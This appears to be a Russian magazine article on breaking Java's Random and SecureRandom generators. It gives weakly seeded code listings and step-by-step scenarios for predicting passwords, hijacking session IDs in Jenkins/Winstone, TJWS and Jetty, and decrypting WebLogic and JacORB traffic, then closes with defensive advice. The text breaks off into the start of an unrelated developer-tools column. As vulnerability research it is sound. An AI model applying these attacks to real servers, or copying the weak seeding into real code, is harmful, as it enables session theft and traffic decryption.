 Java предоставляет два основных генератора псевдослучайных последова-
 тельностей (PRNG): java.util.Random — криптографически нестойкий, но вы-
дающий равномерно распределенную последовательность, и java.security.
 SecureRandom — криптографически стойкий, поэтому может использоваться
 в реализации стойкой криптографии, например для генерации ключей. По-
 скольку Java широко используется,
 эти генераторы  часто встречаются
 в реальных приложениях.
   Общая схема PRNG приведена на
 рис. 1. Внутреннее состояние изме-
 няется функцией перехода (Ft) при вы-
 числении каждого элемента выходной
 последовательности, а функция вы-
 хода (Fo) преобразует внутреннее со-
 стояние в выходные элементы: S0, S1,
 ..., Sn.
   Из общей схемы работы PRNG
 можно отметить следующие потенци-   Рис. 1. Общая конструкция PRNG
 альные уязвимости.
 1. Если внутреннее состояние относительно небольшое, можно просто пере-
   брать все возможные комбинации, а зная внутреннее состояние и конструк-
   цию PRNG (здесь и далее предполагается, что конструкция PRNG известна),
   можно воспроизвести его выходную последовательность.
 2. Если на основании выходной последовательности можно сделать предпо-
   ложения о внутреннем состоянии, то это сокращает перебор.
 3. Если для инициализации PRNG использовался слабый инициализатор
    (seed), то, имея выходную последовательность, можно подобрать seed
    (если seed короче внутреннего состояния, проще перебирать его).

ТЕОРИЯ JAVA.UTIL.RANDOM
 Random — линейный конгруэнтный генератор, имеющий линейную функ-
цию перехода Ft. Внутреннее состояние изменяется так: Statei + 1 = A × Statei +
 + C mod M, где A = 0x5deece66d (A = 25 214 903 917), C = 11, и M = 248. Длина
 внутреннего состояния — 48 бит. Начальное внутреннее состояние (State0) по-
 лучается из seed следующим образом: A ½ seed mod M, где ½ — битовый XOR.
 Механизм инициализации Random будет рассмотрен далее.
   Выходная последовательность генератора представляет собой либо мо-
 дуль внутреннего состояния (иногда такой подход называют «модулярным» или
 «взятие снизу»), либо битово сдвинутое вправо произведение («мультиплика-
 тивный», или «взятие сверху»). В зависимости от используемого метода и их
 параметров Random использует оба подхода (рис. 2).





 Рис. 2. Работа генератора

   Далее будут рассмотрены атаки на внутреннее состояние, когда имеется
 выходная последовательность.
   Метод nextInt(). Код метода приведен в листинге 1. Как видно из листин-
 га, старшие 32 бита внутреннего состояния идут без изменения в выход (рис.
 3), поэтому для восстановления внутреннего состояния необходимо перебрать
 только 16 младших бит. На ноутбуке с четырехъядерным Intel i5 (все дальней-
шие оценки — на этом же ноутбуке) это занимает менее секунды.

                                                                   Рис. 3. nextInt()





 Листинг 1. nextInt()
 protected int next(int bits) {
    long oldseed, nextseed;
    AtomicLong seed = this.seed;
    do {
       oldseed = seed.get();
       nextseed = (oldseed * multiplier + addend) & mask;
    } while (!seed.compareAndSet(oldseed, nextseed));
    return (int)(nextseed >>> (48 - bits));
 }

 public int nextInt() {
    return next(32);
 }

Метод nextLong(). В данном случае внутреннее состояние изменяется дваж-
ды для генерации одного выходного элемента (рис. 4, листинг 2). Сценарий
 атаки здесь полностью повторяет nextInt(). Как и прежде, атака занимает
 менее секунды.





 Рис. 4. nextLong()

 Листинг 2. nextLong()
 protected int next(int bits) {
    long oldseed, nextseed;
    AtomicLong seed = this.seed;
    do {
       oldseed = seed.get();
       nextseed = (oldseed * multiplier + addend) & mask;
    } while (!seed.compareAndSet(oldseed, nextseed));
    return (int)(nextseed >>> (48 - bits));
 }

 public long nextLong() {
    return ((long)(next(32)) << 32) + next(32);
 }

Метод nextInt(limit), где limit четное (но не степень 2). Атака на этот
 сценарий была известна ранее (goo.gl/uNl2sG, goo.gl/rLzE2g) и основана на ис-
 пользовании генератора с сокращенным внутренним состоянием для восста-
 новления сначала младших 17 бит внутреннего состояния основного генерато-
 ра, а остальное — перебором. Схема атаки приведена на рис. 5, а код
 метода — в листинге 3.

                                                                   Рис. 5. nextInt(2k)





 Листинг 3. nextInt(2k)
 protected int next(int bits) {
    long oldseed, nextseed;
    AtomicLong seed = this.seed;
    do {
       oldseed = seed.get();
       nextseed = (oldseed * multiplier + addend) & mask;
    } while (!seed.compareAndSet(oldseed, nextseed));
    return (int)(nextseed >>> (48 - bits));
 }

 public int nextInt(int n) {
    if (n <= 0)
    throw new IllegalArgumentException("n must be positive");

    if ((n & -n) == n)  // i.e., n is a power of 2
    return (int)((n * (long)next(31)) >> 31);

    int bits, val;
    do {
       bits = next(31);
       val = bits % n;
    } while (bits - val + (n-1) < 0);
    return val;
 }

 Четный limit может быть представлен как n × 2 p, где n — нечетное и p ≥ 1.
 Генератор с сокращенным состоянием длины p + 17 (субгенератор) будет вы-
 давать последовательность, где каждый элемент (Si') однозначно связан с из-
 вестной выходной последовательностью основного генератора: S0' = S0 mod 2 p,
 S1' = S1 mod 2p, …, Sn' = Sn mod 2 p. Если принять во внимание этот факт, кор-
 ректные 17 бит внутреннего состояния могут быть восстановлены. На сле-
дующем шаге 31 старший бит внутреннего состояния подбирается в виде:
 H31bits = (S0 + J × limit) mod 231, то есть с шагом limit. Описанные два шага взло-
ма занимают не больше двух секунд.
   Метод nextInt(limit) где limit — степень 2. В данном случае исполь-
 зуется «мультипликативный» подход к формированию выхода. Код метода при-
 веден в листинге 4.

 Листинг 4. nextInt(2P)
 protected int next(int bits) {
    long oldseed, nextseed;
    AtomicLong seed = this.seed;
    do {
       oldseed = seed.get();
       nextseed = (oldseed * multiplier + addend) & mask;
    } while (!seed.compareAndSet(oldseed, nextseed));
    return (int)(nextseed >>> (48 - bits));
 }

 public int nextInt(int n) {
    if (n <= 0)
    throw new IllegalArgumentException("n must be positive");

    if ((n & -n) == n)  // i.e., n is a power of 2
    return (int)((n * (long)next(31)) >> 31);

    int bits, val;
    do {
       bits = next(31);
       val = bits % n;
    } while (bits - val + (n-1) < 0);
    return val;
 }

 Если внутреннее состояние пробовать взломать полным перебором, ища
 его в виде X = (S0 ⋅ 248 – p + t) mod 248, необходимо перебрать все возможные
 t ∈[0; 248 – p – 1].
   Но при анализе зависимости выхода Si от разных t было обнаружено, что Si
 изменяется на 1 mod limit, только когда t увеличится на некоторое число c, та-
 кое, что 213 – p < c < 214 – p, c ~ 213,44644 – p. Такое поведение объясняется алгорит-
мом изменения внутреннего состояния и получения из него выхода: предыду-
щее внутреннее состояние умножается на большое целое A = 0x5deece66dL
 (~234,55), что эквивалентно сдвигу влево на ~34 бита, поэтому внутреннее состо-
 яние должно быть изменено более чем с раз, прежде чем это отразится в выхо-
 де. Рис. 6 показывает зависимость Si от t.





 Рис. 6. Зависимость выходной последовательности от t

   Знание зависимости выходной последовательности от t позволяет при пе-
 реборе пропускать значения t, которые будут давать на выходе известные Si, что
 в общем случае при переборе позволяет пропускать (limit – 1)c значений t и со-
 кращает сложность перебора с O(248 – p) до O(248 – 2p). Например, если limit = 64,
 сложность перебора составит ~236 вместо ~242.
   Метод nextInt(limit), где limit нечетное. В данном случае использу-
 ется «модульный» подход к формированию выхода. Код метода приведен в ли-
 стинге 5.

 Листинг 5. nextInt(2k + 1)
 protected int next(int bits) {
    long oldseed, nextseed;
    AtomicLong seed = this.seed;
    do {
       oldseed = seed.get();
       nextseed = (oldseed * multiplier + addend) & mask;
    } while (!seed.compareAndSet(oldseed, nextseed));
    return (int)(nextseed >>> (48 - bits));
 }

 public int nextInt(int n) {
    if (n <= 0)
    throw new IllegalArgumentException("n must be positive");

    if ((n & -n) == n)  // i.e., n is a power of 2
    return (int)((n * (long)next(31)) >> 31);

    int bits, val;
    do {
       bits = next(31);
       val = bits % n;
    } while (bits - val + (n-1) < 0);
    return val;
 }

 Искать внутреннее состояние будем в виде X = (217 H31bits + L17bits) mod 248, где
 H31bits — старшие 31 и L17bits — младшие 17 бит. С учетом алгоритма работы ге-
 нератора H31bits можно искать в следующем виде: H31bits = (S0 + J ⋅ limit) mod 231,
 где S0 — первый элемент имеющейся выходной последовательности, то есть
 перебором через limit, а L17bits «в лоб» пришлось бы подбирать с шагом 1.
   Однако при анализе зависимости выхода Si от L17bits при увеличении на 1
 была обнаружена зависимость, показанная на рис. 7.





 Рис. 7. Зависимость выхода от младших 17 бит внутреннего состояния


   Элементы выходной последовательности генератора могут быть записаны
 в виде матрицы, имеющей d столбцов и 217/d строк, где d = min i:(A  ⋅  i) >>
>> 17 = (limit – 1) mod limit, а A = 0x5deece66d — то же A, что используется при
 смене внутреннего состояния генератора. В каждом столбце матрицы значе-
 ния изменяются определенным образом: следующий элемент остается неиз-
 менным, либо уменьшается на 1 mod limit, либо изменяется на p mod limit, либо
 на (p + 1) mod limit, где p = 231 mod limit (рис. 8).





 Рис. 8. Возможные изменения значений в столбцах

   Изменение на p и p + 1 происходит периодически, и период может быть
 рассчитан: period = 231 / (Ad >> 17), где, как и прежде, A = 0x5deece66d.
  С учетом этой зависимости на первом шаге атаки необходимо предвари-
 тельно рассчитать значения L17bit, где выход изменяется на p или p + 1 — таких
 значений будет 217 / (d ⋅ period). На следующем шаге будем перебирать значение
 L17bit, пропуская значения L17bit, заведомо не приводящие к выходу следующего
 элемента известной последовательности S1 (то есть не выдающие взламывае-
мую последовательность). В каждом столбце необходимо выполнить проверку
 217/(d ⋅ limit) значений L17bit, вместо 217/d. Сложность взлома с помощью указан-
 ного алгоритма составляет O(248/period) вместо O(248/limit) в случае полного
 перебора, что может быть значительно эффективнее, если period > limit.
   Инициализация Random. В JDK для инициализации используется вре-
 мя с момента старта системы в наносекундах (System.nanoTime()). В GNU
 Classpath конструктор по умолчанию использует время в миллисекундах с на-
 чала эпохи (System.currentTimeMillis()). Знания об инициализации PRNG
 позволяют эффективнее проводить взлом.
   Основываясь на идеях, описанных выше, мы разработали утилиту команд-
 ной строки JavaCG для эффективного взлома генераторов Random по имею-
 щейся выходной последовательности. Утилита написана на С++11 и работает
 под Windows и Linux, доступна на GitHub.

ПРАКТИЧЕСКАЯ ЭКСПЛУАТАЦИЯ JAVA.UTIL.RANDOM
 От теории к практике! Мы поискали Java-приложения, доступные на sourceforge.
 net, использующие Random для целей безопасности, и обнаружили множество
 парольных менеджеров с функциональностью генерации паролей, например:
 •  MyPasswords;
 •  Mass Password]Generator;
 •  PasswordGenerator;
 •  Java Password Generator;
 •  Safe Password Generator.

 Если злоумышленнику известен один пароль, сгенерированный перечислен-
ными инструментами, он может восстановить внутреннее состояние генерато-
 ра — экземпляра Random, что позволит предсказать последующие и предыду-
щие пароли, сгенерированные этим же генератором.
   Далее мы поискали приложения, использующие Random для сервисов безо-
 пасности, доступные в Сети. В результате был найден контейнер сервлетов
 Winstone. Jenkins — сервер непрерывной интеграции с открытым кодом, поддер-
 живаемый на коммерческой основе CloudBees, и Hudson — также сервер непре-
 рывной интеграции, поддерживаемый Eclipse Foundation, используют по умолча-
 нию Winstone, который достаточно популярен, как можно видеть из рис. 9.





 Рис. 9. Результаты поиска Winstone


   В Winstone Random используется для генерации идентификатора сессии,
 алгоритм  реализован  в  методе  makeNewSession()  класса  winstone.
 WinstoneRequest. Логика генерации ID сессии следующая: фиксированная
 строка «Winstone» конкатенируется с IP-адресом клиента, портом сервера,
 временем генерации в миллисекундах и выходом nextLong() экземпляра
 Random, от полученной строки вычисляется MD5 (рис. 10). PRNG инициализи-
 руется временем в миллисекундах с начала эпохи во время старта сервера.





 Рис. 10. Формирование ID сессии в Jenkins


   Время в миллисекундах дает 10 бит энтропии, поскольку атакующий может
 получить время в секундах из заголовка Date HTTP-ответа, единственное, что
 неизвестно, — количество миллисекунд.
   Следующее, что нужно угадать атакующему, — это значение выхода
 nextLong(). Для воспроизведения выходной последовательности необходи-
мо знать seed, которым был инициализирован генератор, — энтропия 14 бит,
 и количество сгенерированных случайных чисел с момента старта генератора
 (это то же, что и количество сессий с сервером с момента старта Winstone, —
 энтропия log2(количество сгенерированных сессий)). Логично предположить,
 что Winstone стартует вместе с запуском сервера, поэтому инициализирующее
 генератор значение времени будет близко к времени его работы. Можно най-
 ти разные способы определения времени работы сервера, например в Linux
 можно использовать значение TCP timestamp, рекомендованное RFC1323. TCP
 timestamp — это 32-битное значение (timestamp clock) в опциях TCP, исполь-
 зуемое для корректировки интервала RTO (retransmission timeout) и в механиз-
ме PAWS (Protection Against Wrapping Sequence). Timestamp clock инициализи-
 руется известным значением во время старта сервера и инкрементируется с
 фиксированной частотой. Эта функция включена по умолчанию на большинстве
 дистрибутивов Linux. Например, в Ubuntu 12.04 LTS timestamp clock инициали-
 зируется значением –300 и частота инкрементирования составляет 1000 Гц.
 Итак, можно оценить время работы сервера, имея значение timestamp clock, а
 само TCP timestamp можно узнать Nmap’ом с ключом –O.
   Предполагаем, что атакующему известен IP-адрес жертвы или объем пере-
 бора небольшой, поэтому можно пренебречь энтропией IP-адреса.
    Итого, общая энтропия ID сессии: 24 + log2(количество сгенерированных
 сессий). Если даже на момент атаки был сформирован миллион сессий, общая
 энтропия не составит 44 бита, что сравнительно немного и может быть пере-
 брано «в лоб» на практике. Атака реализуется следующим образом:
 1. Атакующий получает новый ID сессии; из заголовка HTTP Date извлекает
   время в секундах и использует его для оценки времени генерации ID сессии
   в миллисекундах.
 2. Атакующий оценивает время работы сервера, например с помощью опи-
   санной выше техники TCP timestamp.
 3. Атакующий в офлайне подбирает внутреннее состояние PRNG.
 4. Атакующий начинает периодически обращаться на сервер, получая новые
    ID сессии, определяя по ним, на сколько изменилось внутреннее состояние
   PRNG: если обнаружено изменение на более чем одно состояние, значит,
   между нашими периодическими подключениями кто-то еще подключился и
   для него был сгенерирован ID сессии; атакующий сохраняет значение вну-
   треннего состояния PRNG и период, в течение которого была произведена
   генерация сессии.
 5. Узнав каким-либо образом IP-адрес подключившегося, атакующий подби-
   рает его ID сессии.

 Сценарий атаки представлен на рис. 11, скрипты для взлома приведены в GitHub.





 Рис. 11. Сценарий атаки на Jenkins


   Видео с демонстрацией атаки доступно здесь. В настоящий момент данная
 уязвимость (CVE-2014-2060) исправлена.



                           Продолжение статьи
 Coverstory


    Начало статьи
СЛУЧАЙНОСТЕЙ
НЕ БЫВАЕТ
ВЗЛОМ ГЕНЕРАТОРА СЛУЧАЙНЫХ ЧИСЕЛ JAVA



ТЕОРИЯ JAVA.SECURITY.SECURERANDOM
 SecureRandom наследован от Random, использует детерминированный алгоритм
 для формирования псевдослучайной последовательности из истинно случайно-
 го seed. В SecureRandom реализована неочевидная логика работы, зависящая
 от операционной системы, параметров -Djava.security.egd, securerandom.
 source и механизма инициализации. Чтобы использовать SecureRandom безо-
 пасно, нужно хорошо разбираться во всех этих особенностях.
   Провайдер JCE по умолчанию sun.security.provider.Sun имеет две ре-
 ализации SecureRandom: NativePRNG и SHA1PRNG. Реализация NativePRNG ис-
 пользуется по умолчанию в Linux и Solaris, его выход представляет собой зна-
 чение SHA1PRNG, сложенное (XOR) с байтами из /dev/random или /dev/urandom,
 поэтому создание экземпляра SecureRandom с фиксированным seed вполне
 безопасно и не приводит к проблемам с производительностью. NativePRNG
 используется, когда securerandom.source=file:/dev/urandom (по умолча-
 нию) или file:/dev/random.
   Следующей реализацией SecureRandom
 является SHA1PRNG — детерминированный
 генератор, использующий SHA1 для форми-
 рования выхода из его внутреннего состоя-
 ния. По умолчанию применяется в Windows.
 Логика его работы приведена на рис. 12.
   Инициализация SHA1PRNG может быть
                                                  Рис. 12. Логика работы SHA1PRNG явной и неявной. По умолчанию поддер-
 живаются  три  варианта  неявной  ини-
 циализации (получения  seed): NativeSeedGenerator, URLSeedGenerator,
 ThreadedSeedGenerator. Какой из них будет использоваться — зависит от
 операционной системы и параметра securerandom.source. Байты seed, по-
 лученные одним из трех способов, конкатенируются с байтами из функции
 getSystemEntropy, и затем результат перемешивается с помощью SHA1:
 State0= SHA1(getSystemEntropy() || seed), где || означает конкатенацию.
   Реализация NativeSeedGenerator работает в случае, если securerandom.
 source равен file:/dev/urandom или file:/dev/random. В Linux и Solaris эта
 реализация читает байты из /dev/random, а в Windows используется Microsoft
 CryptoAPI.
   URLSeedGenerator работает, когда securerandom.source не равен file:/
 dev/urandom или file:/dev/random, он просто читает байты из указанно-
 го источника. Реализация ThreadedSeedGenerator работает, если параметр
 securerandom.source не указан и использует несколько потоков исполнения
 (threads).
   Явная инициализация SHA1PRNG происходит при вызове конструктора
 SecureRandom(byte[] seed) — при этом State0 будет присвоено SHA1(seed) —
 или методов setSeed(long seed) или setSeed(byte[] seed) — здесь Statei
 будет присвоено значение Statei ½ seed.
   Важно отметить, что в Linux и Solaris рекомендуется изменять значение по
 умолчанию securerandom.source ввиду проблем с производительностью, так
 как по умолчанию при неявной инициализации NativeSeedGenerator читает
 байты из /dev/random, который блокируется при нехватке энтропии, что при-
 водит к зависанию приложения.
   Теперь, когда мы знаем теорию работы SecureRandom, пора перейти к прак-
 тике. Возможны два случая небезопасного использования SecureRandom:
 1. SecureRandom инициализируется через конструктор значением seed с ма-
   лой энтропией (обычно временем) (листинг 6).

   Листинг 6. Инициализация через конструктор некачественным seed
   SecureRandom rng = new SecureRandom((new Date()).toString().
   getBytes());

 2. SecureRandom инициализируется методом setSeed значением seed с ма-
   лой энтропией перед вызовом nextBytes (листинг 7).

   Листинг 7. Передача некачественного seed в setSeed() перед вызовом
              nextBytes()
   SecureRandom rng = new SecureRandom();
   rng.setSeed(System.currentTimeMillis());
   byte[] randomBytes = new byte[20];
   rng.nextBytes(randomBytes);

ПРАКТИЧЕСКАЯ ЭКСПЛУАТАЦИЯ НЕБЕЗОПАСНОГО
ИСПОЛЬЗОВАНИЯ SECURERANDOM
Первым примером приложения, использующего SecureRandom небезопасно,
 будет Tiny Java Web Server — небольшой быстрый контейнер сервлетов, спо-
 собный работать на Android и Blackberry, написанный Дмитрием Рогаткиным.
 SecureRandom здесь используется для генерации ID сессии и инициализиру-
 ется временем в секундах (листинг 8 содержит фрагмент кода класса Acme.
 Serve.Serve). В году всего ~225 с, поэтому энтропия такой инициализации
 очень мала. Эта уязвимость может применяться для перехвата пользователь-
 ской сессии (session hijacking). С помощью Shodan можно обнаружить сервисы
 дистанционного банковского обслуживания, использующие RestEasy и TJWS,
 так же была обнаружена MetricStream — GRC-система, использующая TJWS.

 Листинг 8. Генерация ID сессии в TJWS
 srandom = new SecureRandom((arguments.get(ARG_SESSION_SEED) == null
   ? "TJWS" + new Date() : (String) arguments.get(ARG_SESSION_SEED)).
   getBytes());

 synchronized String generateSessionId() {
    srandom.nextBytes(uniqer);
    // TODO swap randomly bytes
    return Utils.base64Encode(uniqer);
 }

Следующим примером будет Oracle WebLogic — сервер приложений Java EE,
 у которого есть коннектор WTC — WebLogic Tuxedo connector к серверу прило-
 жений Tuxedo, используемому для приложений на C, C++, Cobol. WTC реали-
 зует протокол LLE — Link-Level encryption для защиты соединения WebLogic с
 Tuxedo. Связка WebLogic — Tuxedo используется, например, при развертыва-
 нии Oracle PeopleSoft.
   Листинг 9 содержит фрагменты кода класса weblogic.wtc.jatmi.tplle, выпол-
няющие инициализацию LLE.

 Листинг 9. Фрагменты класса weblogic.wtc.jatmi.tplle
 private byte[] getMyPublicValue() throws Exception {
    if ((this.g == null) || (this.p == null)) {
       throw new Exception("must get parameters before paublic
                            value");
    }
    if (rnd == null) {
       rnd = new SecureRandom();
    }
    try {
       rnd.setSeed(System.currentTimeMillis());
       rnd.setSeed(Runtime.getRuntime().freeMemory());
       rnd.setSeed(Runtime.getRuntime().totalMemory());
       rnd.setSeed(System.getProperty("java.version", "default").
           getBytes());
       rnd.setSeed(System.getProperty("java.vendor", "default").
           getBytes());
       rnd.setSeed(System.getProperty("os.name", "default").
           getBytes());
       rnd.setSeed(System.getProperty("os.version", "default").
           getBytes());
       rnd.setSeed(System.getProperty("user.name", "default").
           getBytes());
       rnd.setSeed(System.getProperty("user.dir", "default").
           getBytes());
       rnd.setSeed(System.getProperty("user.home", "default").
           getBytes());
       rnd.setSeed(System.getProperty("java.home", "default").
           getBytes());
       rnd.setSeed(System.getProperty("java.class.path", "default").
           getBytes());
       rnd.setSeed(System.currentTimeMillis());
    } catch (Exception localException) {}
    this.x1 = new BigInteger(128, rnd);
    this.y1 = this.g.modPow(this.x1, this.p);
    return unpad(this.y1.toByteArray());
 }

 BigInteger localBigInteger = this.y2.modPow(this.x1, this.p);

 this.x1 = null;
 byte[] arrayOfByte2 = unpad(localBigInteger.toByteArray());

 localBigInteger = null;
 for (j = 0; j < this.sendKey.length; j++) {
    this.sendKey[j] = arrayOfByte2[j];
 }

 for (j = 0; j < this.recvKey.length; j++) {
    this.recvKey[j] = arrayOfByte2[(arrayOfByte2.length / 2 + j)];
 }

LLC использует алгоритм Диффи — Хеллмана (DH) для создания пары ключей
 RC4. Приватный ключ DH для WebLogic генерируется SecureRandom, инициали-
 зируемым методом setSeed. Случайность инициализации берется из времени
 в миллисекундах (10 бит энтропии) и количества свободного памяти в куче (10
 бит энтропии). Интервал между вызовами currentTimeMillis() в этой реа-
 лизации не превышает одной миллисекунды, поэтому следующий вызов доба-
 вит лишь один бит энтропии. Оставшиеся параметры могут быть определены,
 если взять систему аналогичной конфигурации. Данная уязвимость позволяет
 атакующему, перехватившему публичный DH-ключ Tuxedo, расшифровать за-
щищаемый трафик. Данная уязвимость была исправлена в Oracle Critical Patch
 Update за октябрь 2014 года.
   Третьим интересным примером плохой инициализации SecureRandom яв-
 ляется JacORB — реализация ORB (Object Request Broker) в Java. CORBA ис-
 пользуется для построения распределенных приложений, работающих на раз-
 ных платформах. Серверы приложений JBoss и JOnAS содержат библиотеки
 JacORB, а протокол IIOP (Internet Inter-Orb Protocol) используется для взаимо-
 действия. IIOP может защищаться с использованием SSL (SSLIOP). Листинги
 10 и 11 показывают, как SSLIOP реализован в JacORB.

 Листинг 10. Фрагмент класса
             org.jacorb.security.ssl.sun_jsse.JSRandomImpl
 public SecureRandom getSecureRandom() {
    SecureRandom rnd = new SecureRandom();
    rnd.setSeed(4711);

    return rnd;
 }

 Листинг 11. Фрагмент класса
             org.jacorb.security.ssl.sun_jsse.SSLSocketFactory
 SSLContext ctx = SSLContext.getInstance("TLS");

 ctx.init( (kfm == null)? null : kfm.getKeyManagers(),
          trustManagers,
          sslRandom.getSecureRandom() );

 return ctx.getSocketFactory();

В классе JSRandomImpl создается экземпляр SecureRandom, инициализирует-
 ся значением 4711 методом setSeed (листинг 10) и передается в экземпляр
 класса SSLContext во время инициализации SSL с помощью метода init (ли-
 стинг 11).
   Чтобы понять, как SecureRandom используется в SSLContext, необходимо
 внимательно ознакомиться, как случайные числа используются в SSL в случае
 применения RSA OAEP.
   Если SecureRadnom плохо инициализирован на клиенте, атакующий, пере-
 хватывающий SSL-трафик, может расшифровать его. Эта атака демонстрирует-
 ся здесь: с помощью ARP-спуфинга атакующий перехватывает трафик SSLIOP,
 извлекает элементы SSL handshake и передает их в скрипт compute-master.py,
 который вычисляет ключ. Затем ключ передается в Wireshark, который расшиф-
 ровывает SSL.

GNU CLASSPATH
GNU Classpath — свободная альтернативная реализация стандартной библио-
 теки классов Java 5. GNU Classpath используется свободными JVM (Java Virtual
 Machine), такими, например, как JamVM, SableVM, Kaffe, CACAO. Любопытно,
 что в SableVM SecureRandom неявно инициализируется с помощью вызова new
 Random(0), — это серьезная уязвимость всех приложений, работающих на
 SableVM.
   Широко известный дистрибутив Linux для ано-
 нимного интернет-серфинга Liberté Linux исполь-
 зуется GNU Classpath и JamVM.
   SecureRandom в GNU Classpath реализован
 проще, чем в JDK. При неявной инициализации
 используется 32-байтное значение seed, логи-
 ка формирования которого реализована в классе
                                                           Рис. 13. Выходная
 SecureRandomAdapter. Выходная последователь-                                                        последовательность
 ность представляет собой SHA512 от внутреннего    в GNU Classpath
 состояния (рис. 13).
   При инициализации GNU Classpath пытается извлечь случайность из следу-
ющих источников:
 •  из файла, заданного параметром securerandom.source в /usr/local/
   classpath/lib/security/classpath.security;
 •  из файла, заданного параметром командной строки java.security.egd;
 •  при  помощи  метода  generateSeed  из  класса  java.security.
   VMSecureRandom. Метод generateSeed получает seed, используя механизм
   генерации с помощью потоков выполнения (threads): создаются восемь по-
   токов (рабочие), которые инкрементируют свои внутренние счетчики, а дру-
   гой поток (основной) запускает цикл из 32 итераций и на каждой из них вы-
   числяет один байт seed путем сложения (XOR) значений счетчиков рабочих
   потоков (листинг 12). Затем основной поток вызывает Thread.yield(), ко-
   торый информирует планировщик потоков, что вызывающий поток желает
    уступить свое процессорное время.

 Листинг 12. Генерация байтов seed в методе generateSeed()
 for (int i = offset; i < length; i++) {
    buffer[i] = (byte) (spinner[0].value ^ spinner[1].value ^
    spinner[2].value
          ^ spinner[3].value ^ spinner[4].value ^ spinner[5].value
          ^ spinner[6].value ^ spinner[7].value);
    Thread.yield();
 }

Проблема в том, что планировщик может игнорировать это «желание» потока
 и продолжить его исполнение goo.gl/TUWFmk.
    Рис. 14 показывает, что происходит при вызове generateSeed на системе с од-
 ним процессом с одним ядром, — все сгенерированные 32 байта одинаковы! На
самом деле первый байт может отличаться, но остальные всегда одинаковы.





 Рис. 14. generateSeed на одноядерном процессоре

   Для исследования такого поведения класс VMSecureRandom был модифици-
 рован для вывода значений счетчиков всех рабочих потоков (spinner) на каждой
 итерации. Рис. 15 показывает 10 из 32 итераций: видно, что счетчики рабочих
 потоков отличаются только на первой итерации, а все остальные остаются не-
 изменными. Причина такого поведения в стремлении планировщика «честно»
 распределить процессорное время после первой итерации, и все последую-
щие итерации он игнорирует просьбу основного потока отдать его процессор-
 ное время рабочим, поэтому цикл прокручивается 31 раз без изменения счет-
 чиков рабочих процессов.





 Рис. 15. Вывод модифицированного VMSecureRandom на машине с одним процессором

   Если метод generateSeed вызывается на системе с двумя процессорами,
 тогда все байты seed кажутся различными (рис. 16).





 Рис. 16. generateSeed на машине с двумя процессорами

   Но, вызвав generateSeed модифицированного VMSecureRandom, можно ви-
 деть, что счетчик только одного рабочего потока изменяется на всех итераци-
 ях, а счетчики остальных не меняются после первой итерации (рис. 17).





 Рис. 17. Выход модифицированного VMSecureRandom на машине с двумя процессорами

   Если запустить параллельно какую-нибудь задачу, потребляющую процес-
 сорное время, то сформированный seed вновь содержит одинаковые байты
 (рис. 18).





 Рис. 18. generateSeed на двух процессорах одновременно с задачей,
 потребляющей процессорное время

   Если запустить модифицированный VMSecureRandom параллельно с зада-
 чей, потребляющей процессор, видно, что счетчики рабочих потоков изменя-
 ются только на первой итерации (рис. 19). В общем случае сформированный
 seed будем иметь 32 одинаковых байта.





 Рис. 19. Выход модифицированного VMSecureRandom, работающего параллельно с задачей,
 потребляющей процессорное время, на двухпроцессорной машине

   Для демонстрации описанной выше уязвимости использован контейнер
 сервлетов Jetty, работающий на JamVM и GNU Classpath. В прошлом Jetty имел
 [уязвимость перехвата сессии CVE-2007-5614, поэтому сейчас там использу-
 ется SecureRandom для реализации SSL и генерации ID сессии.
   Логика генерации ID сессии расположена в классе org.eclipse.jetty.
 server.session.AbstractSessionIdManager: инициализация — в методе
 public void initRandom() (листинг 13), непосредственно генерация — в ме-
 тоде public  String  newSessionId(HttpServletRequest request, long
 created) (листинг 14). Пример ID сессии — JSESSIONID=1s3v0f1dneqcv1at4
 retb2nk0u.

 Листинг 13. Метод initRandom.
 _random = new SecureRandom();
 _random.setSeed(_random.nextLong() ^ System.currentTimeMillis() ^
 hashCode() ^ Runtime.getRuntime().freeMemory());

 Листинг 14. Метод newSessionId
 long r0 = _random.nextLong(); long r1 = _random.nextLong();
 if (r0 < 0) r0 = -r0;   if (r1 < 0) r1 = -r1;
 id = Long().toString(r0,36) + Long().toString(r1,36);

 Рассмотрим внимательнее процесс инициации. _random.nextLong() в ре-
 ализации SecureRandom в GNU Classpath дает 16 бит энтропии (здесь ини-
 циализация происходит через механизм потоков исполнения), для взло-
ма атакующий может перебрать все возможные комбинации. System.
 currentTimeMillis() — время в миллисекундах с начала эпохи дает 13 бит
 энтропии — атакующий может оценить это время, используя описанную ранее
 технику TCP timestamp. Runtime.getRuntime().freeMemory() — количество
 свободной памяти в байтах — дает 10 бит энтропии, которые атакующий может
 оценить, взяв систему аналогичной конфигурации. hashCode() — адрес объ-
 екта в куче JVM, что дает 12 бит энтропии и может быть оценено на основании
 известного значения hashcode другого объекта, создаваемого во время стар-
 та сервера Jetty.
   Для целей демонстрации класс AbstractSessionIdManager был незначитель-
 но модифицирован: оставлена только часть _random.nextLong() (листинг 15).

 Листинг 15. Фрагмент модифицированного AbstractSessionIdManager
 _random = new SecureRandom();
 _random.setSeed(_random.nextLong());

 Демонстрация атаки (ее сценарий полностью аналогичен представленному ра-
 нее на рис. 11) приведена в YouTube, а используемый скрипт доступен на GitHub.
   Данную уязвимость можно исправить, заменив вызов Thread.yeild()
 на Thread.sleep(1) в коде метода generateSeed.

ЗАКЛЮЧЕНИЕ
 Как же можно бороться с описанными уязвимостями? Во-первых, Random ни-
 когда не должен использоваться для целей, связанных с безопасностью, вме-
 сто него должен использоваться SecureRandom. Во-вторых, никогда не сле-
 дует заниматься изобретением своего криптографически стойкого PRNG,
 значительно безопаснее использовать какой-либо из готовых. В-третьих, при
 использовании SecureRandom необходимо быть уверенным, что он правиль-
 но инициализирован, то есть что энтропия достаточно велика. И последнее:
 добавление новой свежей энтропии в SecureRandom методом setSeed значи-
 тельно повысит безопасность.
PC ZONE
 ПРОТОТИПИРУЙ
  ПРАВИЛЬНО,
ВЕРСТАЙ БЫСТРО
          ПОДБОРКА
     ПРИЯТНЫХ ПОЛЕЗНОСТЕЙ
      ДЛЯ РАЗРАБОТЧИКОВ

Мы живем в прекрасном мире, где программисты
не стесняются выкладывать различные вкусности в па-
блик — нужно лишь знать, где их искать. Достаточно
побродить по GitHub и другим площадкам для разме-
щения кода, и ты найдешь решение для любой про-
блемы. Даже для той, которой у тебя до этого момента
и не было.





                                          Илья Пестов
                                                         @ilya_pestov,
                                                        ipestov.com



AutoLayout.js

 github.com/IjzerenHein/autolayout.js
 Существует множество различных фреймворков или даже, правильнее сказать,
 тулкитов (ExtJS, Dojo, Webix), которые проповедуют свой синтаксис размет-
